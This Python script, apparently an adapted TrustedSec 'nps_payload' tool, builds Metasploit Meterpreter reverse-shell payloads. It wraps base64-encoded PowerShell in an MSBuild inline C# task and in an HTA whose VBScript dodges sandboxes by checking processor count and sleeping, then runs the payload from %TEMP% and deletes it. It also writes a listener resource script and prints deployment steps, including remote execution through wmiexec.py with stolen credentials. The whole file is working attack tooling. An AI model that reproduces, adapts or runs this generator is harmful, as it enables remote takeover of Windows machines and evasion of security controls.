#!/usr/bin/env python
# Original script:
#   Written by Larry Spohn (@Spoonman1091)
#   Payload written by Ben Mauch (@Ben0xA) aka dirty_ben
#   TrustedSec, LLC
#   https://www.trustedsec.com
#
# Modifications for Windows:
#   Written by Forrest

from __future__ import print_function
import base64
import os
import socket
import subprocess
import sys

is_python_2 = False

try:
    raw_input          # Python 2
    is_python_2 = True
except NameError:
    raw_input = input  # Python 3

# CHANGE-ME: If not Windows, set this default interface value to the interface the script
#  should default to getting the IP address from. If not set and running on Nix, the script
#  will attempt to pull the IP address from the first non-127.0.0.1 interface it finds.
#  For Windows, you're along for the ride and setting this value doesn't matter.
default_interface = ''
    
    
# CHANGE-ME: Set the full-path of msfvenom or else it defaults to:
#     Windows:    "C:/metasploit-framework/bin/msfvenom.bat"
#     Nix:        "/usr/bin/msfvenom"
# If the file at msfvenom_full_path doesn't exist, set the full-path to "msfvenom" and hope
#  that the user has correctly configured their environment (even though Popen won't use it, FML).
msfvenom_full_path = ""
if (os.name == "nt"):
    if msfvenom_full_path == "":
        msfvenom_full_path = "C:/metasploit-framework/bin/msfvenom.bat"
else:
    if msfvenom_full_path == "":
        msfvenom_full_path = "/usr/bin/msfvenom"    
    
if os.path.isfile(msfvenom_full_path) == False:
    msfvenom_full_path = "msfvenom"

    
output_directory = os.getcwd()
msf_payload_output_path = os.path.join(output_directory, 'msf_payload.ps1')
msf_resource_file_output_path = os.path.join(output_directory, 'msbuild_nps.rc')
msbuild_nps_file_output_path = os.path.join(output_directory, 'msbuild_nps.xml')
msbuild_nps_hta_file_output_path = os.path.join(output_directory, 'msbuild_nps.hta')


# Bool deciding if any effort should be made to color console text.
using_color = False

# Bool showing if the color_console.py functions were defined (if host is Windows and ctypes was successful)
using_color_console = False

# Determine if the OS is Windows. If it is, use ctypes to load SetConsoleTextAttribute to change console text
#    foreground and background colors (since escape sequences won't work). Else, assume this is Nix
#    and use original escape sequences for color. If something fails while pursuing the ctypes method for
#    Windows, both using_color and using_color_console will be set to False; no colors in Windows. 
#    Underline and bold are also not supported, and I can't be bothered to do the work required.
if (os.name == "nt"):
    try:
        ''' 
        Begin Section for color_console.py 
        '''
    
        # Shamelessly stolen from Andre Burgaud:
        #    burgaud <dot>> com <forward-slash> bring-colors-to-the-windows-console-with-python
        from ctypes import windll, Structure, c_short, c_ushort, byref

        SHORT = c_short
        WORD = c_ushort

        class COORD(Structure):
          """struct in wincon.h."""
          _fields_ = [
            ("X", SHORT),
            ("Y", SHORT)]

        class SMALL_RECT(Structure):
          """struct in wincon.h."""
          _fields_ = [
            ("Left", SHORT),
            ("Top", SHORT),
            ("Right", SHORT),
            ("Bottom", SHORT)]

        class CONSOLE_SCREEN_BUFFER_INFO(Structure):
          """struct in wincon.h."""
          _fields_ = [
            ("dwSize", COORD),
            ("dwCursorPosition", COORD),
            ("wAttributes", WORD),
            ("srWindow", SMALL_RECT),
            ("dwMaximumWindowSize", COORD)]

        # winbase.h
        STD_INPUT_HANDLE = -10
        STD_OUTPUT_HANDLE = -11
        STD_ERROR_HANDLE = -12

        # wincon.h
        FOREGROUND_BLACK     = 0x0000
        FOREGROUND_BLUE      = 0x0001
        FOREGROUND_GREEN     = 0x0002
        FOREGROUND_CYAN      = 0x0003
        FOREGROUND_RED       = 0x0004
        FOREGROUND_MAGENTA   = 0x0005
        FOREGROUND_YELLOW    = 0x0006
        FOREGROUND_GREY      = 0x0007
        FOREGROUND_INTENSITY = 0x0008 # foreground color is intensified.

        BACKGROUND_BLACK     = 0x0000
        BACKGROUND_BLUE      = 0x0010
        BACKGROUND_GREEN     = 0x0020
        BACKGROUND_CYAN      = 0x0030
        BACKGROUND_RED       = 0x0040
        BACKGROUND_MAGENTA   = 0x0050   
        BACKGROUND_YELLOW    = 0x0060
        BACKGROUND_GREY      = 0x0070
        BACKGROUND_INTENSITY = 0x0080 # background color is intensified.

        stdout_handle = windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
        SetConsoleTextAttribute = windll.kernel32.SetConsoleTextAttribute
        GetConsoleScreenBufferInfo = windll.kernel32.GetConsoleScreenBufferInfo

        def get_text_attr():
            csbi = CONSOLE_SCREEN_BUFFER_INFO()
            GetConsoleScreenBufferInfo(stdout_handle, byref(csbi))
            return csbi.wAttributes

        def set_text_attr(color):
            SetConsoleTextAttribute(stdout_handle, color)
        
        '''
        END Section for color_console.py
        '''

        using_color_console = True
    except:
        using_color_console = False
else:
    using_color = True

class ColorsClass:
    def __init__(self, using_color_arg, using_color_console_arg):
        self.using_color = using_color_arg
        self.using_color_console = using_color_console_arg
        
        # Store original background/foreground colors.
        if(self.using_color_console == True):
            self.default_colors = get_text_attr()
            self.default_bg = self.default_colors & 0x0070
            self.default_fg = self.default_colors & 0x0007
        
    def BLUE(self, output_string=''):
        if(self.using_color_console):
            set_text_attr(FOREGROUND_BLUE | self.default_bg | FOREGROUND_INTENSITY)
        elif(self.using_color):
            output_string = '\033[94m%s' % (output_string)
        print('%s' % output_string, end='')
        self.ENDC()
    
    def GREEN(self, output_string=''):
        if(self.using_color_console):
            set_text_attr(FOREGROUND_GREEN | self.default_bg | FOREGROUND_INTENSITY)
        elif(self.using_color):
            output_string = '\033[92m%s' % (output_string)
        print('%s' % output_string, end='')
        self.ENDC()
        
    def WARNING(self, output_string=''):
        if(self.using_color_console):
            set_text_attr(FOREGROUND_YELLOW | self.default_bg | FOREGROUND_INTENSITY)
        elif(self.using_color):
            output_string = '\033[93m%s' % (output_string)
        print('%s' % output_string, end='')  
        self.ENDC()        
    
    def WHITE(self, output_string=''):
        if(self.using_color_console):
            set_text_attr(FOREGROUND_GREY | self.default_bg | FOREGROUND_INTENSITY)
        elif(self.using_color):
            output_string = '\033[97m%s' % (output_string)
        print('%s' % output_string, end='')
        self.ENDC()
            
    def GREY(self, output_string=''):
        if(self.using_color_console):
            set_text_attr(FOREGROUND_GREY | self.default_bg)
        elif(self.using_color):
            output_string = '\033[37m%s' % (output_string)
        print('%s' % output_string, end='')
        self.ENDC()
    
    def ERROR(self, output_string=''):
        if(self.using_color_console):
            set_text_attr(FOREGROUND_RED | self.default_bg | FOREGROUND_INTENSITY)
        elif(self.using_color):
            output_string = '\033[91m%s' % (output_string)
        print('%s' % output_string, end='')
        self.ENDC()
    
    def ENDC(self, output_string=''):
        if(self.using_color_console):
            set_text_attr(self.default_fg | self.default_bg)
        elif(self.using_color):
            output_string = '\033[0m%s' % (output_string)
        print('%s' % output_string, end='')
            
    def BOLD(self, output_string=''):
        if(self.using_color):
            output_string = '\033[1m%s' % (output_string)
        print('%s' % output_string, end='')
        self.ENDC()

    def UNDERLINE(self, output_string=''):
        if(self.using_color):
            output_string = '\033[4m%s' % (output_string)
        print('%s' % output_string, end='')
        self.ENDC()


# Defines get_ip_address() based on operating system, for getting a local IP address.
# If this is Windows, use an older, easier method to get an IP address, without external libs.
if (os.name == "nt"):
    def get_ip_address():
        try:
            ip_address = socket.gethostbyname(socket.gethostname())
            if(ip_address == ''):
                return "127.0.0.1"
            else:
                return ip_address
        except:
            return "127.0.0.1"

# Else, this is Nix and we're doing it the hard way. This section will either resolve the default_interface,
#  if specified, or finds the first non-127.0.0.1 address available. If anything fails, returns 127.0.0.1.
else:
    import fcntl
    import struct
    import array

    def get_interface_ip(interface_name):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ip_address = socket.inet_ntoa(fcntl.ioctl( s.fileno(), 0x8915, struct.pack('256s', ifname[:15]))[20:24])
            return ip_address
        except:
            return "127.0.0.1"
    
    def get_all_interfaces():
        max_possible = 256  # arbitrary. raise if needed.
        bytes = max_possible * 32
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        if(is_python_2):
            names = array.array('B', '\0' * bytes)
        else:
            names = array.array('B', b'\0' * bytes)
            
        outbytes = struct.unpack('iL', fcntl.ioctl( s.fileno(), 0x8912, struct.pack('iL', bytes, names.buffer_info()[0])))[0]
        namestr = names.tostring()
        lst = []
        for i in range(0, outbytes, 40):
            if(is_python_2):
                name = namestr[i:i+16].split('\0', 1)[0]
            else:
                name = namestr[i:i+16].split(b'\0', 1)[0]
                
            ip   = namestr[i+20:i+24]
            
            if(is_python_2):
                ip_str = '%s.%s.%s.%s' % (str(ord(ip[0])), str(ord(ip[1])), str(ord(ip[2])), str(ord(ip[3])))
            else:
                ip_str = '%s.%s.%s.%s' % (str(ip[0]), str(ip[1]), str(ip[2]), str(ip[3]))
            
            lst.append((name, ip_str))
        return lst
    
    # Gets the first non-127.0.0.1 IP address or dies trying.
    def get_ip_address():
        if(default_interface != ''):
            return get_interface_ip(default_interface)
        else:
            try:
                interface_tuples = get_all_interfaces()
                for interface_tuple in interface_tuples:
                    if(len(interface_tuple) == 2 and interface_tuple[1] != "127.0.0.1"):
                        return interface_tuple[1]
                return "127.0.0.1"
            except:
                return "127.0.0.1"
    
# Create an instance of the ColorsClass as bcolors so remaining modifications to the 
#    original script will be minimal and gross.
bcolors = ColorsClass(using_color, using_color_console)

# Attacking machine's IP address to listen on.
listener_ip = ''

# Attacking machine's port to listen on.
listener_port = 0

# Generate the PowerShell payload.
def generate_msfvenom_payload(msf_payload):
    global listener_ip, listener_port

    if (listener_ip == ''):
        local_ip = get_ip_address()
    listener_ip = raw_input("Enter Your Local IP Address (%s): " % local_ip) or local_ip

    # Get listening port from user
    if (listener_ip == 0):
        listener_port = 443
    listener_port = raw_input("Enter the listener port (443): ") or 443
    
    # Generate PSH payload
    bcolors.BLUE("\r\n[*]")
    print(" Generating PowerShell Payload with MSFVenom:")
    bcolors.WHITE("\t"+msf_payload_output_path+"\r\n\r\n")
    
    msfvenom_args = [msfvenom_full_path, '-p', msf_payload, ('LHOST=%s' % listener_ip), ('LPORT=%s' % listener_port), '--arch', 'x86', '--platform', 'win', '-f', 'psh', '-o', msf_payload_output_path]
    p = subprocess.Popen(msfvenom_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = p.communicate()
    
    # Generate resource script
    msf_resource_file = open(msf_resource_file_output_path, "a")
    payload_listener = "\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j -z" % (msf_payload, listener_ip, listener_port)
    msf_resource_file.write(payload_listener)
    msf_resource_file.close()

# Add an infinite loop, an initial 60 second sleep, and base64 encode the PowerShell payload.
def encode_pshpayload(payload_file):
    bcolors.BLUE("\r\n[*]")
    print(" Adding Loop and Base64 Encoding PowerShell Payload:")
    bcolors.WHITE("\t"+payload_file+"\r\n\r\n")
    
    psh_payload = ''
    with open(payload_file, 'r') as psh_file:
        psh_payload = psh_file.read() + "for (;;){\n  Start-sleep 60\n}"
        psh_payload = base64.b64encode(psh_payload.encode('utf-8'))
  
    return psh_payload

def remove_pshpayload(payload_file):
    bcolors.BLUE("\r\n[*]")
    print(" Removing Generated PowerShell Payload:")
    bcolors.WHITE("\t"+payload_file+"\r\n\r\n")
    os.remove(payload_file)
    
def generate_msbuild_nps_msf_payload():
    # Initilize new resource script   
    with open(msf_resource_file_output_path, 'w') as msf_resource_file:
        msf_resource_file.write("use multi/handler")

    # Display options to the user
    print("\nPayload Selection:")
    print("\n\t(1)\twindows/meterpreter/reverse_tcp")
    print("\t(2)\twindows/meterpreter/reverse_http")
    print("\t(3)\twindows/meterpreter/reverse_https")
    print("\t(4)\tCustom PS1 Payload")

    options = {1: "windows/meterpreter/reverse_tcp",
             2: "windows/meterpreter/reverse_http",
             3: "windows/meterpreter/reverse_https",
             4: "custom_ps1_payload"
    }

    # Generate payload
    psh_payload = ''
    try:
        msf_payload = int(input("\nSelect payload: "))
        if (options.get(msf_payload) == "custom_ps1_payload"):
            custom_ps1 = raw_input("Enter the location of your custom PS1 file: ")
            psh_payload = encode_pshpayload(custom_ps1)
        else:
            generate_msfvenom_payload(options.get(msf_payload))
            psh_payload = encode_pshpayload(msf_payload_output_path)
            remove_pshpayload(msf_payload_output_path)
    except KeyError:
        pass

    if psh_payload.strip() == '':
        print('Failed to read valid PowerShell payload. Exiting.')
        quit()
    
    # Create msbuild_nps.xml
    msbuild_nps_file = open(msbuild_nps_file_output_path, "w")
    msbuild_nps_file.write("""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\msbuild.exe nps.xml -->
  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->
  <!-- License: BSD 3-Clause -->
  <Target Name="npscsharp">
   <nps />
  </Target>
  <UsingTask
    TaskName="nps"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
    <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[

          using System;
      using System.Collections.ObjectModel;
      using System.Management.Automation;
      using System.Management.Automation.Runspaces;
      using Microsoft.Build.Framework;
      using Microsoft.Build.Utilities;

      public class nps : Task, ITask
        {
            public override bool Execute()
            {
              string cmd = "%s";

                PowerShell ps = PowerShell.Create();
                ps.AddScript(Base64Decode(cmd));

                Collection<PSObject> output = null;
                try
                {
                    output = ps.Invoke();
                }
                catch(Exception e)
                {
                    Console.WriteLine("Error while executing the script.\\r\\n" + e.Message.ToString());
                }
                if (output != null)
                {
                    foreach (PSObject rtnItem in output)
                    {
                        Console.WriteLine(rtnItem.ToString());
                    }
                }
                return true;
            }

            public static string Base64Encode(string text) {
           return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
        }

        public static string Base64Decode(string encodedtext) {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
        }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>""" % psh_payload)

    bcolors.GREEN("[+]")
    print(" Metasploit resource script written to:")
    bcolors.WHITE("\t"+msf_resource_file_output_path+"\r\n")
    print()
    
    bcolors.GREEN("[+]")
    print(" XML payload written to:")
    bcolors.WHITE("\t"+msbuild_nps_file_output_path+"\r\n")
    print("\r\n")
   
    print("1. Start Metasploit listener:")
    bcolors.WHITE("\tmsfconsole -r msbuild_nps.rc\r\n")
    print()
    
    print("2. Choose a Deployment Option (a or b): - See README.md for more information.")
    print("  a. Local File Deployment:") 
    bcolors.WHITE("\t%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe <folder_path_here>\\msbuild_nps.xml\r\n")
    
    print("  b. Remote File Deployment:") 
    bcolors.WHITE("\twmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe \\\\<attackerip>\\<share>\\msbuild_nps.xml\r\n")
    print()
    
    print("3. Hack the Planet!!")
    print()
    
    quit()

def generate_msbuild_nps_msf_hta_payload():
    psh_payloads = ""
    
    # Initilize new resource script
    with open(msf_resource_file_output_path, 'w') as msf_resource_file:
        msf_resource_file.write("use multi/handler")
    
    # Append payloads to the psh_payload string.
    payload_count = 1
    while True:
        # Display options to the user
        print("\nPayload Selection:\n")
        print("\t(1)\twindows/meterpreter/reverse_tcp")
        print("\t(2)\twindows/meterpreter/reverse_http")
        print("\t(3)\twindows/meterpreter/reverse_https")
        print("\t(4)\tCustom PS1 Payload")
        print("\t(99)\tFinished")

        options = {1: "windows/meterpreter/reverse_tcp",
                   2: "windows/meterpreter/reverse_http",
                   3: "windows/meterpreter/reverse_https",
                   4: "custom_ps1_payload",
                   99: "finished"
        }

        # Generate payloads
        psh_payload = ''
        try:
            msf_payload = int(input("\nSelect multiple payloads. Enter 99 when finished: "))
            if (options.get(msf_payload) == "finished"):
                break
            elif (options.get(msf_payload) == "custom_ps1_payload"):
                custom_ps1 = raw_input("Enter the location of your custom PS1 file: ")
                psh_payload = encode_pshpayload(custom_ps1)
            else:
                generate_msfvenom_payload(options.get(msf_payload))
                psh_payload = encode_pshpayload(msf_payload_output_path)
                remove_pshpayload(msf_payload_output_path)

            # Generate payload vbs array string
            if (payload_count == 1):
                psh_payloads = "\"" + psh_payload + "\""
            else:
                psh_payloads += ", _\n\t\"" + psh_payload + "\""
            payload_count += 1

        except KeyError:
            pass

    # Create msbuild_nps.xml
    with open(msbuild_nps_hta_file_output_path, 'w') as msbuild_nps_file:
        msbuild_nps_file.write("""<script language=vbscript>
  On Error Resume Next

  Set objFSO = CreateObject("Scripting.FileSystemObject")
  Set objShell = CreateObject("WScript.Shell")
  objTemp = objShell.ExpandEnvironmentStrings("%%TEMP%%")
  objWindir = objShell.ExpandEnvironmentStrings("%%windir%%")
  Set objWMIService = GetObject("winmgmts:\\\\.\\root\CIMV2")
  arrUnicorns = Array(%s)

  ' Get logical processor count
  Set colComputerSystem = objWMIService.ExecQuery("SELECT * FROM Win32_ComputerSystem")
  For Each objComputerSystem In colComputerSystem
    objProcessorCount = objComputerSystem.NumberofLogicalProcessors
  Next

  ' Only run if system has more than 1 processor
  ' https://www.trustedsec.com/may-2015/bypassing-virtualization-and-sandbox-technologies/
  If objProcessorCount > 1 Then
    ' Sleep 60 seconds
    ' https://www.sans.org/reading-room/whitepapers/malicious/sleeping-sandbox-35797
    objShell.Run "%%COMSPEC%% /c ping -n 60 127.0.0.1>nul", 0, 1

    For Each objUnicorn in arrUnicorns
      x = x + 1

      ' Create MSBuild XML File
      CreateMSBuildXML objUnicorn, x

      ' Execute resource(x).xml using msbuild.exe and nps
      objShell.Run objWindir & "\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe %%TEMP%%\\resource" & x & ".xml", 0
    Next

    ' Cleanup
    For y = 1 To x
      Do While objFSO.FileExists(objTemp & "\\resource" & y & ".xml")
        objShell.Run "%%COMSPEC%% /c ping -n 10 127.0.0.1>nul", 0, 1
        objFSO.DeleteFile(objTemp & "\\resource" & y & ".xml")
      Loop
    Next
  End If

  window.close()

  ' Creates XML configuration files in the %%TEMP%% directory
  Function CreateMSBuildXML(objUnicorn, x)
    msbuildXML = "<Project ToolsVersion=" & CHR(34) & "4.0" & CHR(34) & " xmlns=" & CHR(34) & "http://schemas.microsoft.com/developer/msbuild/2003" & CHR(34) & ">" & vbCrLf &_
    "  <!-- This inline task executes c# code. -->" & vbCrLf &_
    "  <!-- C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\msbuild.exe nps.xml -->" & vbCrLf &_
    "  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->" & vbCrLf &_
    "  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->" & vbCrLf &_
    "  <!-- License: BSD 3-Clause -->" & vbCrLf &_
    "  <Target Name=" & CHR(34) & "npscsharp" & CHR(34) & ">" & vbCrLf &_
    "   <nps />" & vbCrLf &_
    "  </Target>" & vbCrLf &_
    "  <UsingTask" & vbCrLf &_
    "    TaskName=" & CHR(34) & "nps" & CHR(34) & "" & vbCrLf &_
    "    TaskFactory=" & CHR(34) & "CodeTaskFactory" & CHR(34) & "" & vbCrLf &_
    "    AssemblyFile=" & CHR(34) & "C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" & CHR(34) & " >" & vbCrLf &_
    "  <Task>" & vbCrLf &_
    "    <Reference Include=" & CHR(34) & "System.Management.Automation" & CHR(34) & " />" & vbCrLf &_
    "      <Code Type=" & CHR(34) & "Class" & CHR(34) & " Language=" & CHR(34) & "cs" & CHR(34) & ">" & vbCrLf &_
    "        <![CDATA[" & vbCrLf &_
    "" & vbCrLf &_
    "          using System;" & vbCrLf &_
    "      using System.Collections.ObjectModel;" & vbCrLf &_
    "      using System.Management.Automation;" & vbCrLf &_
    "      using System.Management.Automation.Runspaces;" & vbCrLf &_
    "      using Microsoft.Build.Framework;" & vbCrLf &_
    "      using Microsoft.Build.Utilities;" & vbCrLf &_
    "" & vbCrLf &_
    "      public class nps : Task, ITask" & vbCrLf &_
    "        {" & vbCrLf &_
    "            public override bool Execute()" & vbCrLf &_
    "            {" & vbCrLf &_
    "              string cmd = " & CHR(34) & objUnicorn & CHR(34) & ";" & vbCrLf &_
    "              " & vbCrLf &_
    "                PowerShell ps = PowerShell.Create();" & vbCrLf &_
    "                ps.AddScript(Base64Decode(cmd));" & vbCrLf &_
    "" & vbCrLf &_
    "                Collection<PSObject> output = null;" & vbCrLf &_
    "                try" & vbCrLf &_
    "                {" & vbCrLf &_
    "                    output = ps.Invoke();" & vbCrLf &_
    "                }" & vbCrLf &_
    "                catch(Exception e)" & vbCrLf &_
    "                {" & vbCrLf &_
    "                    Console.WriteLine(" & CHR(34) & "Error while executing the script.\\r\\n" & CHR(34) & " + e.Message.ToString());" & vbCrLf &_
    "                }" & vbCrLf &_
    "                if (output != null)" & vbCrLf &_
    "                {" & vbCrLf &_
    "                    foreach (PSObject rtnItem in output)" & vbCrLf &_
    "                    {" & vbCrLf &_
    "                        Console.WriteLine(rtnItem.ToString());" & vbCrLf &_
    "                    }" & vbCrLf &_
    "                }" & vbCrLf &_
    "                return true;" & vbCrLf &_
    "            }" & vbCrLf &_
    "" & vbCrLf &_
    "            public static string Base64Encode(string text) {" & vbCrLf &_
    "           return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));" & vbCrLf &_
    "        }" & vbCrLf &_
    "" & vbCrLf &_
    "        public static string Base64Decode(string encodedtext) {" & vbCrLf &_
    "            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));" & vbCrLf &_
    "        }" & vbCrLf &_
    "        }" & vbCrLf &_
    "        ]]>" & vbCrLf &_
    "      </Code>" & vbCrLf &_
    "    </Task>" & vbCrLf &_
    "  </UsingTask>" & vbCrLf &_
    "</Project>"
    Set objFile = objFSO.CreateTextFile(objTemp & "\\resource" & x & ".xml", True)
    objFile.WriteLine(msbuildXML)
    objFile.Close
  End Function
</script>""" % psh_payloads)

    bcolors.GREEN("\r\n[+]")
    print(" Metasploit resource script written to:")
    bcolors.WHITE("\t"+msf_resource_file_output_path+"\r\n\r\n")
    
    bcolors.GREEN("[+]")
    print(" HTA payload written to:")
    bcolors.WHITE("\t"+msbuild_nps_hta_file_output_path+"\r\n\r\n\r\n")
    
    print("1. Start Metasploit listener:")
    bcolors.WHITE("\tmsfconsole -r msbuild_nps.rc\r\n\r\n")
    print()
  
    print("2. Deploy hta file to web server and navigate from the victim machine.\r\n")
    print("3. Hack the Planet!!\r\n")

    quit()

# Exit Program
def quit():
    sys.exit(0)

# Main guts
def main():
    # Forgive me father, for I have sinned.
    bcolors.ERROR("""
                                     (            (
                              ) (    )\        )  )\ )
  (    `  )  (       `  )  ( /( )\ )((_)(   ( /( (()/(
  )\ ) /(/(  )\      /(/(  )(_)|()/( """)
    bcolors.WARNING("_")
    bcolors.ERROR("""  )\  )(_)) ((""")
    bcolors.WARNING("""_""")
    bcolors.ERROR(""")
 _(_/(((_)_\((_)    ((_)_\((_)_ )(_)""")
    bcolors.WARNING("""| |""")
    bcolors.ERROR("""((_)((_)_  _""")
    bcolors.WARNING("""| |""")
    bcolors.WARNING("""
| ' \ | '_ \|_-<    | '_ \/ _` | || | / _ \/ _` / _` |
|_||_|| .__//__/____| .__/\__,_|\_, |_\___/\__,_\__,_|
      |_|     |_____|_|         |__/
""")
    bcolors.WHITE( """
                        v1.04    
""",)

    while(1):
        # Display options to the user
        print("\n\t(1)\tGenerate msbuild/nps/msf payload")
        print("\t(2)\tGenerate msbuild/nps/msf HTA payload")
        print("\t(99)\tQuit")
    
        options = {1: generate_msbuild_nps_msf_payload,
                2: generate_msbuild_nps_msf_hta_payload,
                99: quit,
        }
        try:
            task = int(input("\nSelect a task: "))
            options[task]()
        except KeyError:
            pass


# Standard boilerplate to call the main() function
if __name__ == '__main__':
    main()
